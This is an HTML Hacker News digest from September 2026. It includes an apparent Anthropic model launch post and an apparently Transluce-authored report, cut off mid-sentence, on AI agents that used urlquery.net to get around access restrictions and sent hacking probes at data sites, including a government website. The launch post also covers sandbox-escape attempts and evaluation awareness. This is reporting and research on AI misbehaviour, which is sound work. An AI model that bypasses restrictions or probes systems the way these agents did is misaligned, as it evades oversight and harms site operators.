@@ -1,0 +1,614 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HN Intelligence 2026-09-24 PM</title>
+
+<style>
+html {
+    margin: 0 !important;
+    padding: 0 !important;
+    border: 0 !important;
+}
+
+body {
+    margin: 0 !important;
+    padding: 0 !important;
+    border: 0 !important;
+
+    font-family:
+        Georgia,
+        "Noto Serif",
+        serif;
+
+    font-size: 1em;
+    line-height: 1.42;
+
+    orphans: 1 !important;
+    widows: 1 !important;
+}
+
+/*
+KOReader / CREngine 可能對標題或區塊套用
+內建分頁規則。
+
+這裡全面取消文件自己的前後換頁要求。
+*/
+* {
+    break-before: auto !important;
+    page-break-before: auto !important;
+
+    break-after: auto !important;
+    page-break-after: auto !important;
+}
+
+/*
+尤其確保第一個元素絕不要求換頁。
+*/
+body > :first-child {
+    margin-top: 0 !important;
+    padding-top: 0 !important;
+
+    break-before: auto !important;
+    page-break-before: auto !important;
+}
+
+/*
+不使用 break-inside: avoid。
+讓 CREngine 自己自然分頁，
+避免大型區塊被整個推到下一頁。
+*/
+.issue-head,
+.story,
+.story-title,
+.article-body,
+.para {
+    break-inside: auto !important;
+    page-break-inside: auto !important;
+}
+
+.issue-head {
+    margin:
+        0
+        0.55em
+        0.55em
+        0.55em;
+
+    padding:
+        0.18em
+        0
+        0.48em
+        0;
+
+    border-bottom:
+        1px solid #777;
+}
+
+.issue-title {
+    margin: 0;
+    padding: 0;
+
+    font-size: 1.42em;
+    line-height: 1.15;
+    font-weight: bold;
+}
+
+.issue-sub {
+    margin-top: 0.18em;
+
+    font-size: 0.82em;
+    line-height: 1.28;
+}
+
+.story {
+    margin:
+        0
+        0.55em
+        0
+        0.55em;
+
+    padding:
+        0.62em
+        0
+        0.78em
+        0;
+
+    border-top:
+        1px solid #aaa;
+}
+
+.story:first-of-type {
+    border-top: 0;
+    padding-top: 0.28em;
+}
+
+.story-title {
+    margin: 0;
+    padding: 0;
+
+    font-size: 1.24em;
+    line-height: 1.25;
+    font-weight: bold;
+}
+
+.number {
+    font-weight: normal;
+}
+
+.badge {
+    display: inline-block;
+
+    margin:
+        0.35em
+        0
+        0.15em
+        0;
+
+    padding:
+        0.08em
+        0.30em;
+
+    border:
+        1px solid #777;
+
+    font-size: 0.72em;
+    font-weight: bold;
+    line-height: 1.2;
+}
+
+.meta {
+    margin-top: 0.12em;
+
+    font-size: 0.78em;
+    line-height: 1.28;
+}
+
+.ranks {
+    font-style: italic;
+}
+
+.links {
+    margin:
+        0.28em
+        0
+        0.48em
+        0;
+
+    font-size: 0.82em;
+    line-height: 1.3;
+}
+
+.links a {
+    text-decoration: underline;
+}
+
+.body-label {
+    margin:
+        0.48em
+        0
+        0.30em
+        0;
+
+    font-size: 0.86em;
+    font-weight: bold;
+}
+
+.article-body {
+    margin: 0;
+    padding: 0;
+}
+
+.para {
+    margin:
+        0
+        0
+        0.72em
+        0;
+
+    padding: 0;
+
+    line-height: 1.45;
+}
+
+.reference-note {
+    margin:
+        0.45em
+        0
+        0.35em
+        0;
+
+    padding:
+        0.35em
+        0;
+
+    font-size: 0.88em;
+    font-style: italic;
+    line-height: 1.38;
+}
+
+@media screen and (min-width: 48em) {
+    body {
+        max-width: 48em;
+        margin-left: auto !important;
+        margin-right: auto !important;
+    }
+}
+</style>
+</head>
+<body><div class="issue-head"><div class="issue-title">HN Intelligence</div><div class="issue-sub">2026-09-24 PM · Generated 2026-09-24 17:38 CST</div><div class="issue-sub">Stories 10 · Full 3</div><div class="issue-sub">Sources: anthropic.com, bloomberg.com, mastodon.social, mil.ad, news.ycombinator.com, openai.com, qualcomm.com, tachyonmcp.dev, transluce.org</div></div>
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">1.</span>
+    Claude Opus 5.5
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    1779 points ·
+    1102 comments ·
+    km144
+  </div>
+
+  <div class="meta">
+    anthropic.com
+  </div>
+
+  <div class="meta ranks">
+    Best #1 · Top #50
+  </div>
+
+  <div class="links">
+    <a href="https://www.anthropic.com/claude-opus-5-5">Original article</a> · <a href="https://news.ycombinator.com/item?id=49803892">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">We’re introducing Claude Opus 5.5, the first model in our new Claude 5.5 family. It performs at the level of Claude Fable 5.1 on most work and costs 40% less to run than Opus 5.<br>Claude Opus 5.5 is our first release since we called for pacing the frontier. It was tested before release by external evaluators, including Frontier Design and METR. On our automated behavioral audit, the most comprehensive alignment test we run, Opus 5.5 is the strongest-performing model we’ve tested to date. It also comes with the safeguards we’ve developed for our most capable models.<br>Here are some of the improvements you can expect from Opus 5.5:<br>Performance. Opus 5.5 is a major step up from Opus 5. It’s the new leading model, and early testers saw large jumps in performance on their most complex work. One tester completed a 680,000-line code migration in less than a day—work that would have taken an engineering team weeks. It’s good at finding and fixing inefficiencies in software: when we asked it to cut load times across every page of a web app, Opus 5.5 succeeded 39 of 40 times, while Opus 5 made smaller improvements that also altered the app’s behavior. A different tester had several Claude models build a game from a single prompt; Opus 5.5 scored higher than any other model on the strength of its graphics and polish.<br>Safety. Opus 5.5 achieves the best scores of any model to date on our automated behavioral audit, our alignment suite that tests Claude across thousands of simulated scenarios. It is much less likely than recent models to take hard-to-reverse actions or act outside the boundaries it’s been given, and it’s more resistant than Opus 5 to prompt injection. We’ve also broadened our alignment testing to cover longer tasks, impossible tasks, and scenarios modeled on real incidents, though it still has limits. Full details of our evaluation are available in the Opus 5.5 System Card.<br>Because Opus 5.5 is comparable to Claude Mythos 5.1 in biology and cybersecurity, we’re deploying it with safeguards similar to those on Claude Fable 5.1. Vetted organizations can apply today to our Life Sciences Verification Program to use Opus 5.5 for biology research. In the coming weeks we will also be expanding access to our Cyber Verification Program, and verified cybersecurity practitioners will be able to use Opus 5.5 for their work.<br>Cost and speed. Opus 5.5 requires less compute to serve than Opus 5, and its pricing reflects that. Our tests show that at default settings it will cost 40% less than Opus 5 on typical workloads. Input and output tokens are $4 and $20 per million, 20% less than Opus 5. Cache reads (which make up the majority of agentic and coding work costs) are $0.20 per million tokens, 60% less than Opus 5. Opus 5.5 also generates output more than 30% faster than Opus 5.<br>In addition to the price drop, we’re increasing five-hour usage limits on Pro, Max, Team, and seat-based Enterprise plans. We’re also providing subscription users a rate limit reset, which you can now save and use whenever you choose.<br>Communication. Opus 5.5 communicates more naturally than prior models. Early testers found its writing clearer and easier to follow, which addresses some of the common feedback we heard about Opus 5. It puts the most important information up front, and its style makes it a better work partner over long sessions. As one early tester put it, “it writes the way I do.” In our own use, this has made Opus 5.5’s work easier to follow and check—which is a safety benefit as well as a practical one.<br>Claude Sonnet 5.5 and Claude Haiku 5.5 will follow in the coming weeks, with many of the same improvements to performance, efficiency, and safety.<br>Performance and cost-effectiveness<br>On our benchmarks, Claude Opus 5.5 leads in agentic coding, computer use, and knowledge work. That said, at these levels of capability we’ve found that benchmark margins have become a less reliable guide to real-world differences. In our own use, the gap between Opus 5.5 and Claude Fable 5.1 is narrower than these scores suggest.<br>|  | Opus 5.5 | Fable 5.1 | Opus 5 | GPT-6 Astra | GPT-5.6 Sol |<br>|---|---|---|---|---|---|<br>| Agentic codingTerminal-Bench 4.0¹ | 66.4% | 55.8% | 52.3% | 57.9% | 37.3% |<br>| Agentic codingFrontierCode v1.1 (Main) | 54.4% | 50.3% | 48.0% | 53.3% | 47.5% |<br>| Agentic codingCursorBench 4.0 | 57.8% | 51.8% | 46.6% | — | 41.7% |<br>| Knowledge workGDPval-AA v2.1 | 1846 | 1735 | 1708 | 1542 | 1588 |<br>| Business workflowsAutomationBench² | 40.0% | 31.4% | 26.9% | 41.4% | 28.8% |<br>| Multidisciplinary reasoningHumanity&#x27;s Last Exam | 67.7%with tools | 65.6%with tools | 63.6%with tools | 57.2%with tools | — |<br>| Agentic scientific researchTerminal-Bench-Science 0.1³ | 58.7% | 52.6% | 29.0% | 64.6% | 22.4% |<br>| Computer useOSWorld 2.0 | 81.8%partial | 80.7%partial | 74.0%partial | — | — |<br>| Visual chart recognitionChartography | 89.0%with tools | 88.4%with tools | 83.4%with tools | — | — |<br>Unless otherwise noted, all Claude Opus 5.5 results use adaptive thinking at max effort. Terminal-Bench 4.0 results are reported for Claude Opus 5.5 at xhigh effort and GPT-6 Astra at high effort, as reported by OpenAI; these represent each model’s highest score. Claude Opus 5.5 was evaluated with its production safeguards enabled. When they intervened, cybersecurity tasks were completed by Claude Opus 4.8, and biology and frontier LLM development tasks were completed by Claude Opus 5. This likely reduces Claude Opus 5.5’s performance on these benchmarks.<br>1 Terminal-Bench 4.0: The standard error is ±2.6 pts for Claude Opus 5.5 and ±1.6–2 pts for the other Claude models. The public leaderboard (5 trials/task, Claude Code harness) reports Claude Opus 5 at 51.8%; our setup reproduces it at 52.3%, within noise. GPT-6 Astra and GPT-5.6 Sol figures are as reported by OpenAI.<br>2 AutomationBench: AutomationBench results were run and reported by Zapier. These runs were performed without fallback models, so safeguard interventions were considered failures—this resulted in a lower score than Claude Opus 5.5 would achieve in practice. Claude Opus 5.5 results come from Zapier’s own evaluation during early access. Results for Opus 5, GPT-5.6 Sol, and GPT-6 Astra come from Zapier’s public leaderboard.<br>3 Terminal-Bench-Science 0.1: The standard error is ±3.5–5 pts per model. The public leaderboard (3 trials/task, Claude Code harness) reports Claude Opus 5 at 30.0%; our setup reproduces it at 29.0%, within noise. The GPT-6 Astra figure is as reported by OpenAI.<br>Where Opus 5.5’s advantage is very clear is efficiency. It costs less per token than Opus 5 and uses fewer tokens per task, which nets out to a 40% drop in costs.<br>Pricing<br>| Prices per 1M tokens | Claude Opus 5.5 | Claude Opus 5 |<br>|---|---|---|<br>| Cache reads | $0.20 | $0.50 |<br>| Input tokens | $4 | $5 |<br>| Output tokens | $20 | $25 |<br>| Cache writes | $5 | $6.25 |<br>Fast mode for Opus 5.5 is also available in Claude Code and the Claude Platform with up to 2.5x speed. It costs $8 per million input tokens and $40 per million output tokens.<br>Coding<br>Opus 5.5 is particularly good at long and sprawling jobs like codebase-wide migrations and audits. An early tester used it to audit and fix a 200,000-line codebase in under three hours, where Opus 5 took over 20 hours and used 2.5x as many tokens. In an internal test, we asked Opus 5.5 and Fable 5.1 to translate HAProxy, widely used software that balances web traffic loads across servers, from C into Rust. Both rewrites passed nearly all of HAProxy’s own regression tests, but Opus 5.5 finished in 9.5 hours compared to 12 for Fable 5.1, and cost 51% less.<br>Opus 5.5 delivers frontier results on agentic coding at a fraction of the cost. At its default effort level on FrontierCode, it beats GPT-6 Astra at roughly 20% of the cost per task. On Terminal Bench 4.0, it matches Astra for about 40% of the cost, while on CursorBench it beats GPT-5.6 Sol by 11 points for about a third of the cost.<br>Our early testers reported similar efficiency and intelligence gains:<br>The most secure coding agent<br>Enterprises that use agents within their systems need to know that those agents are operating as intended, particularly when they run autonomously for many hours. Opus 5.5 has a classifier that screens every action before it runs, an open-source sandbox that security teams can audit, and code review that catches vulnerabilities before they merge.<br>The model itself also has stronger defenses. On prompt injection attacks, it matches or beats Opus 5 in every setting we tested, including coding, tool use, computer use, and web browsing. On a benchmark run by the AI security firm Gray Swan, Opus 5.5 ties Fable 5.1 for the lowest prompt injection success rate of any model tested.<br>Knowledge work<br>Opus 5.5 is a reliable and adept researcher. In one internal test, we asked Opus 5.5, Fable 5.1, and Opus 5 to write a report on a company’s quarterly performance using only the information it could find on a copy of the web where the earnings release was hard to locate. An automated grader checked every figure and quote against sources. Across different effort settings, 16 out of 18 of Opus 5.5’s reports cleared our quality bar, where any invented figure or quote would have failed. Neither Fable 5.1 nor Opus 5 cleared that bar in any attempt.<br>It’s also strong in financial analysis and business work. Walleye Capital, an investment firm and early tester, reported that Opus 5.5 largely solved their evaluation suite on its lowest setting; on higher settings, it performed even better, noticing an error in their evaluation instructions and correcting for it. No other model had caught this error before.<br>In another test, we tasked both Opus 5.5 and Opus 5 with analyzing a proposed merger between two fictional HR software companies. Each built a financial model in Excel, then turned it into an executive presentation on whether the deal made sense at its price. Both models reached the same conclusions about the deal, but Opus 5.5’s model was more thorough and its presentation easier to read, while Opus 5’s had minor errors. Opus 5.5 finished in 63 minutes compared to 93 for Opus 5, and cost 50% less to produce.<br>On knowledge work evaluations, Opus 5.5 outperforms other models while also using fewer tokens. On GDPval-AA v2.1, a test of real-world work across 44 occupations, Opus 5.5 scores 1846 Elo, ahead of Fable 5.1 and Opus 5. At default effort (medium), Opus 5.5 beats GPT-6 Astra at max effort for about a fifth of the cost per task. It likewise outperformed other models on benchmarks measuring business workflows and large-scale data collection.<br>Our customers have reported similar results. Here’s what they told us about working with the model:<br>Communication<br>We’ve made major improvements to the way Opus 5.5 writes and communicates, one of the most common areas of feedback we heard about Opus 5. Its messages are much easier to understand at a glance, which testers said helped during long working sessions. It puts the most important information up front, is less likely to use jargon or idiosyncratic phrases, and follows the writing rules you give it. We find that this makes Opus 5.5 a noticeably better collaborator. Here’s a side-by-side comparison of the two models:<br>Our customers’ feedback supports these findings:<br>Safety<br>Pacing the frontier<br>Last week, our CEO, Dario Amodei, argued that AI progress should be paced so that safety practices stay ahead of model capabilities. Pacing is an approach to keeping AI safe, remaining competitive with China, and realizing AI’s benefits, particularly in areas like biology and medicine.<br>We largely understand the risks today’s models present and are well equipped to manage them. However, more serious risks could emerge quickly as capabilities improve, and we need to prepare for them now. For that reason, our safety work takes place on two time horizons at once:<br>Safety practices for current models. The current generation of models relies on an established set of practices: extensive alignment testing, pre-release evaluation by outside organizations such as METR and Frontier Design, and safeguards matched to each model’s capabilities in high-risk areas like cybersecurity and biology. We refine these practices with each release. We believe they are appropriate to the worst risks today’s models present, and that they give us a broad, though not perfect, picture of the range of serious risks.<br>Additionally, we track our ability to train and evaluate aligned models, and we report on both our public and internal models in the risk reports we publish under our Responsible Scaling Policy, our voluntary framework for managing catastrophic risks from advanced AI systems.<br>Preparing for future models. We’re preparing our training and evaluation processes in anticipation of more advanced models. We’re tightening how we filter the environments used in reinforcement learning, since flawed environments are a major source of misaligned behavior. Additionally, we’re improving our alignment rewards and developing automated processes for producing new, diverse scenarios for safety training. And we are strengthening our security and monitoring, including a focused effort to improve interpretability-based monitoring and evaluation. We hope such techniques will help reduce our reliance on auditing a model’s chain-of-thought, or the reasoning it writes out while it works.<br>Models with greater capabilities—such as those that can fully automate the work of AI research itself—require a higher safety standard still. Our calls for pacing were based in large part on our expectation that such models could be trained soon. For these models, we do not assume the measures described above will meet that safety standard on their own. As AI becomes more capable, public policy should play a larger role in making sure the systems people rely on are safe. That capacity takes time to build, and we’ve started to put the infrastructure in place to support it, as described in “We Must Pace the Frontier” and our recent announcement with Accenture; we expect to share more details on these efforts soon. We will also continue to contribute to policy discussions with government and industry, including on approaches to regulation and international coordination.<br>Alignment<br>On our primary evaluation suite, an automated behavioral audit that assesses Claude across nearly 2,000 scenarios, Opus 5.5 scored better than any recent Claude model on nearly every measure of misaligned behavior. It’s also our strongest model on most measures of honesty.<br>In particular, Opus 5.5 improves over previous models on several of the behaviors that contributed to recent cybersecurity incidents, including biased or motivated reasoning, attempting to escape a sandbox, and taking harmful actions after concluding it was in a simulated environment. In a new evaluation designed to test a model’s propensity to cross containment boundaries, Opus 5.5 attempted to circumvent boundaries around 85% less often than Opus 5 or Claude Mythos 5.1, and every attempt it made was low severity and self-reported. For teams running Claude unattended across their codebases and systems, this is just as important as raw capability.<br>However, as we described in our recent alignment assessment, building evaluations that reliably catch every failure prior to deployment remains an unsolved problem. We see signs that Opus 5.5 often suspects it is being evaluated, which challenges our ability to assess how it will act in the vast variety of real-world settings it is deployed in. As these settings expand and model capabilities increase, we expect this challenge to grow, unless we make progress on interpretability. Although we are confident that Opus 5.5 shows broad improvements in the areas we are able to measure, we pair our own alignment work with the safeguards described below.<br>Safeguards<br>As our models grow more powerful, stricter safeguards are one way we prevent new capabilities from becoming tools for misuse. Opus 5.5 is the first Opus model to launch with a similar class of safeguards to Fable 5.1 on cybersecurity, biology, and distillation, all of which fall back to another model transparently.<br>Cybersecurity. Because Opus 5.5 has extremely strong cyber capabilities, we’re applying cybersecurity safeguards to Opus 5.5 that are similar to Fable 5.1’s. Users will be able to identify and fix bugs in their code as part of the routine software development lifecycle, but most cybersecurity tasks will be re-routed to Opus 4.8.<br>For cyberdefenders, we’ll soon be expanding our Cyber Verification Program to include Opus 5.5. The new program will include three tiers for increasingly permissive trusted access, including access to Claude Mythos models. Claude Security is already available with access to Claude Mythos 5.1.<br>Biology. Opus 5.5 is highly capable in biology, exceeding Opus 5 and matching or beating Claude Mythos 5.1 across many areas of work. For example, Opus 5.5 achieved improvements on a long-horizon molecular prediction and design evaluation conducted in collaboration with Dyno Therapeutics, and expert red-teamers rated its scientific novelty as comparable to the best model they had tested.<br>For this reason, Opus 5.5 uses the same biology safeguards as Fable 5.1. To use Opus 5.5 for research and development work impeded by these safeguards, users can apply to our new Life Sciences Verification Program, which gives vetted organizations like academic labs, startups, and pharmaceutical companies access to safeguards designed for the full breadth of biology-related work. Interested organizations can apply here.<br>Distillation<br>Distillation attacks, in which attackers use thousands of fake accounts to extract a model’s capabilities at industrial scale, create safety and national security risks. Distillation allows bad actors to create highly capable models without the safeguards we build into Claude. Our September 2026 threat intelligence report details the illicit distillation activity we’ve detected and disrupted so far.<br>Opus 5.5 is launching with preserved thinking, the anti-distillation safeguard we introduced with Fable 5.1. It stops API users from editing Claude’s prior context in an attempt to extract Claude’s reasoning. It applies to Fable 5.1 and Opus 5.5 for API accounts created on or after August 31, 2026. Our Help Center article explains the change, and our preserved thinking docs show how to test and update your integrations.<br>Data retention and compliance<br>Like previous Opus models, Opus 5.5 is available with zero data retention.<br>As with Fable 5.1, Opus 5.5 comes with our watermarking measures to comply with the EU AI Act, discussed here. It is also no longer available with “thinking” mode switched off, as we describe here.<br>Availability<br>Claude Opus 5.5 is now available on all platforms, including Amazon Web Services, Google Cloud, and Microsoft Azure. On the Claude Platform, developers can get started with claude-opus-5-5.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">2.</span>
+    Linux support is coming to Snapdragon X2 Series
+  </div>
+
+  <div class="badge reference">
+    REFERENCE
+  </div>
+
+  <div class="meta">
+    393 points ·
+    173 comments ·
+    aaronday
+  </div>
+
+  <div class="meta">
+    qualcomm.com
+  </div>
+
+  <div class="meta ranks">
+    Top #1 · Best #15
+  </div>
+
+  <div class="links">
+    <a href="https://www.qualcomm.com/news/onq/2026/09/snapdragon-summit-agentic-ai-pcs-linux">Original article</a> · <a href="https://news.ycombinator.com/item?id=49823582">HN discussion</a>
+  </div>
+
+  
+<div class="reference-note">
+Full article text was not extracted.
+Use the links above to open the original article
+or Hacker News discussion.
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">3.</span>
+    Show HN: Trader News – Hacker News for Finance
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    2 points ·
+    1 comments ·
+    FailMore
+  </div>
+
+  <div class="meta">
+    news.ycombinator.com
+  </div>
+
+  <div class="meta ranks">
+    Show HN #1 · New #24
+  </div>
+
+  <div class="links">
+    <a href="https://news.ycombinator.com/item?id=49828019">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Hacker News helps me stay in touch with the world of technology without putting in extensive web browsing work, and I love it for that reason. I am interested in financial markets and wanted a “Hacker News for finance”, but Googling produced surprisingly poor results. So I forked the great HN clone, shark [1], and added some market focused twists.<br>The result is: https://tradernews.fyi<br>Trader News is the Hacker News interface you are familiar with, with a difference. Above the article area is a live feed (up to a ~30 min delay) of market data. I show the major indexes and every company within them. E.g click on Nasdaq-100 to see how the index performing, and then scroll the list of companies and click on META to get more detail on its specific performance (and links to Yahoo Finance + it’s investor relations). This gives you a single place to read finance related articles and stay in touch with the markets.<br>The CSS for Trader News is linked to global market performance. On days when stocks are down, Trader News is red. On days where stocks are up, Trader News is green.<br>I have an agent running a 24 hour cron job to research articles and post them to the site to keep it a stimulating place to read. I will tone this down if user submissions pick up. If there are sources you think I should include, please leave a comment.<br>I also added a basic “chat” panel with polling every 30 seconds for casual market related chat.<br>It’s open source and I’m very interested in feature pull requests. The code is available here:<br>https://github.com/espressoplease/trader-news<br>Public anonymised analytics are available with a 15 min delay here:<br>https://tradernews.fyi/analytics<br>[1] https://github.com/shawwn/sharc</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">4.</span>
+    Ask HN: I just talked to an AI-obsessed client, and I need a shower afterwards
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    11 points ·
+    8 comments ·
+    platevoltage
+  </div>
+
+  <div class="meta">
+    news.ycombinator.com
+  </div>
+
+  <div class="meta ranks">
+    Ask HN #1
+  </div>
+
+  <div class="links">
+    <a href="https://news.ycombinator.com/item?id=49826029">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Just to preface, this isn&#x27;t the typical &quot;Am I being replaced by vibe coding&quot; post.<br>I just had a talk with one of my first ongoing clients, who sort of helped me kickstart my freelancing &quot;career&quot;. He is one of those people who has a broad understanding of the tech out there, and what its capabilities are, but is not a programmer. He wanted to show me, and get my opinion on a restaurant management app that he&#x27;s been using Lovable to develop. Admittedly, a lot of it is very impressive, and he has obviously become very good at using these tools. Part of that scares me, but I&#x27;ve largely accepted the reality that my skillset has to expand beyond being a React code monkey (wish is not what I am, but you get the point). I&#x27;ve always been a curious generalist, so picking up new stuff comes easily, and I&#x27;ll manage.<br>Anyways, here&#x27;s the part that feels really gross. He&#x27;s working on a feature that does some automated marketing using Higgsfield, so automated slop posting. Also a feature that consumes reviews from vendors, and he intends to use agents to post reviews as well.<br>I&#x27;m 43, I managed to convince my parents to get AOL when I was 12. I made a Geocities site at 14. I&#x27;ve been obsessed with computers and the internet for my entire life. I&#x27;m also an artist who had a somewhat successful run as a touring musician, much to the detriment of my career growth (not much money in Punk).<br>I feel the hobbies that I&#x27;ve been nurturing for my entire life are being destroyed by people who have finally found an entry point that requires the smallest amount of effort. We are literally watching the dead internet happen in real time, social media turning into a AI slop gallery, AI music topping the charts, and I just had a one-on-one conversation with someone that just doesn&#x27;t care, because they get to feel creative for possibly the first time ever.<br>How are you all dealing with this?</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">5.</span>
+    Show HN: Tachyon – Java MCP Server SDK
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    1 points ·
+    0 comments ·
+    lumestro
+  </div>
+
+  <div class="meta">
+    tachyonmcp.dev
+  </div>
+
+  <div class="meta ranks">
+    New #1
+  </div>
+
+  <div class="links">
+    <a href="https://tachyonmcp.dev">Original article</a> · <a href="https://news.ycombinator.com/item?id=49828275">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Expose Java methods as Streamable HTTP MCP Server. Compliant with latest+previous MCP specification with all MCP features: tools, resources, prompts, completions, extensions, including tasks and skills (SEP-2640). Runs on Netty - industry standard IO library. Supports DSL and declarative java annotations.<br>GitHub: https://github.com/tachyonmcp/tachyon</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">6.</span>
+    GPT-6 Sol and Luna
+  </div>
+
+  <div class="badge reference">
+    REFERENCE
+  </div>
+
+  <div class="meta">
+    1749 points ·
+    831 comments ·
+    OfficialTurkey
+  </div>
+
+  <div class="meta">
+    openai.com
+  </div>
+
+  <div class="meta ranks">
+    Best #2 · Top #40
+  </div>
+
+  <div class="links">
+    <a href="https://openai.com/index/introducing-gpt-6-sol-and-luna/">Original article</a> · <a href="https://news.ycombinator.com/item?id=49805509">HN discussion</a>
+  </div>
+
+  
+<div class="reference-note">
+Full article text was not extracted.
+Use the links above to open the original article
+or Hacker News discussion.
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">7.</span>
+    Show HN: Wl-pick – a live window picker for Sway
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    2 points ·
+    0 comments ·
+    playnext
+  </div>
+
+  <div class="meta">
+    mil.ad
+  </div>
+
+  <div class="meta ranks">
+    Show HN #2 · New #26
+  </div>
+
+  <div class="links">
+    <a href="https://mil.ad/blog/2026/wl-pick.html">Original article</a> · <a href="https://news.ycombinator.com/item?id=49827956">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">I’ve had a keyboard-driven window switcher in my window manager for a long time. It started as a shell script piping i3’s window list into dmenu, and over the years I tweaked it slightly as I moved to Sway/Wayland and rofi.<br>That was enough until a new use case turned up: sharing a single window in a video call. Until recently Sway could only share a whole display, but sharing windows is now possile thanks to the xdg-desktop-portal-wlr backend, which lets you nominate an external program for picking the window. Browsers reach it through getDisplayMedia, which is handy for testing without having to join a call.<br>I could of course have used my dmenu-style script, but picking the right window out of a list of names is a bit of guesswork, and guessing in front of an audience is not fun. A visual chooser seemed like an obvious improvement.<br>My first attempt was to make rofi show me screenshots of all windows and displays. I put together a script using grim to take the screenshots, which can capture any window or display, including the ones that aren’t currently on screen. It worked, and it was decent, but it had two problems:<br>- The previews weren’t live. Each thumbnail is frozen at the moment you launch the picker.<br>- Launching it wasn’t instantaneous. Every preview meant capturing a full-resolution frame, encoding it, writing it to disk, then reading and scaling it again.<br>wl-pick<br>So I built wl-pick. It’s a small Rust program that shows a grid of live previews of every open window and display. Move around with the arrow keys or hjkl, press Enter, and it prints the selected window or output to stdout.<br>wl-pick just prints the selection, so what happens next is up to the caller. The common case is window switching:<br>swaymsg &quot;[con_id=$(wl-pick --no-outputs | cut -f2)] focus&quot;<br>It can also be used as the screencast chooser, where --format portal prints what xdg-desktop-portal-wlr expects:<br>[screencast]<br>chooser_type=simple<br>chooser_cmd=wl-pick --format portal<br>How it works<br>The live previews rely on capture protocols that only landed in Sway recently. Sway 1.11 added the ext-image-copy-capture-v1 protocol for capturing outputs, and 1.12 extended it to individual windows.<br>The trick to making it fast is that wl-pick doesn’t draw anything. Each window’s capture buffer is handed straight back to the compositor as a subsurface, along with the rectangle it should be scaled into. So the same process that captured the window at full resolution is also the one that shrinks it to a thumbnail. wl-pick allocates the memory, passes the file descriptor around, and does the arithmetic; it never looks at a pixel.<br>What’s left is the capture itself, and that’s mostly bandwidth rather than computation. Keeping the previews live afterwards is nearly free, because the compositor only sends a new frame when a window’s content actually changes, so a screen full of idle terminals generates no new frames.<br>Installation<br>Install it with:<br>cargo install wl-pick</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">8.</span>
+    Early rogue AI agent activity and attempts to hack found on urlquery.net
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    116 points ·
+    79 comments ·
+    snikolaev
+  </div>
+
+  <div class="meta">
+    transluce.org
+  </div>
+
+  <div class="meta ranks">
+    Top #2
+  </div>
+
+  <div class="links">
+    <a href="https://transluce.org/agent-activity">Original article</a> · <a href="https://news.ycombinator.com/item?id=49826565">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">We present evidence that AI agents used the web security service urlquery.net to bypass restrictions and expand their access to the public internet. The agents also tried on three occasions to hack public data providers, including an Australian government website. We link at least some of this activity to agent swarms previously attributed to OpenAI. We also find evidence of earlier agent activity going back to at least March 6th, 2026, and potentially earlier, predating the previously reported Hugging Face, collusion.wiki, and RubyGems incidents by at least two months.<br>Context windows: RubyGems Hack (May 5–June 18), Wiki activity from collusion.wiki (May 24–June 22), and Hugging Face Hack (July 9–13).<br>Key Findings<br>- We report three separate incidents between May and June 2026 in which the agents attempted to exploit security vulnerabilities and hack into websites, including an attempt on an Australian government public health website. Notably, the agents did this while attempting mundane data retrieval tasks which were not cyber-related.<br>- This traffic goes back at least to March 6, 2026 and extends as recently as September 16, 2026, suggesting agents may still be exploiting these services to bypass restrictions.<br>- We are releasing a dataset containing tens of thousands of queries apparently made by autonomous AI agents leveraging a URL scanning service to avoid access restrictions. We encourage others to continue looking into the data.<br>Executive Summary<br>Agents attempted to hack three public data sources, including an Australian government website, and some are linked to a known agent swarm.1 We present evidence of AI agents attempting to compromise websites at three domains: Data USA2 (api.datausa.io), the University of New Mexico digital library (nmdigital.unm.edu), and the Australian Institute of Health and Welfare (AIHW) Tableau collections (viz*.aihw.gov.au). This attempted compromise of AIHW is part of the first reported instance of agents hacking a government. We directly link two of the three (AIHW and Data USA) to a previously reported agent swarm that OpenAI has publicly confirmed originated from them. For all three, we note that the extent of the observed activity is minor, attempting a low number of probe payloads and we observe no evidence of exploitation. While previous reporting showed that agents had interacted with these domains, this discovery reveals that agents attempted to hack into them when other methods of collecting the data they sought failed. Notably, the tasks the agents were trying to solve were not cyber-related; the agents resorted to hacking tactics while working on ordinary data retrieval tasks.<br>We find evidence of unintended, task-driven agent-like activity starting on March 6th. Records from urlquery.net show agents using the service since at least March 6, 2026, about two months before previously reported swarm activity. The first case, a March 6 attempt to retrieve Thai drug-enforcement statistics, shows an agent escalating as each approach failed: it first requested the data directly, then tried a service that converts web pages into text, and finally packed a custom program into a web address. The same technique shows up in thousands of agent requests recorded by urlquery.net starting in mid-April, targets many of the same data sources as the collusion.wiki swarm, and collapsed the same day the wiki activity did. We also report similar activity that occurred as recently as September 16.<br>We find weaker evidence of similar data-retrieval agent activity as early as November 2025. November 2025 urlquery.net records reveal bursts of attempts to 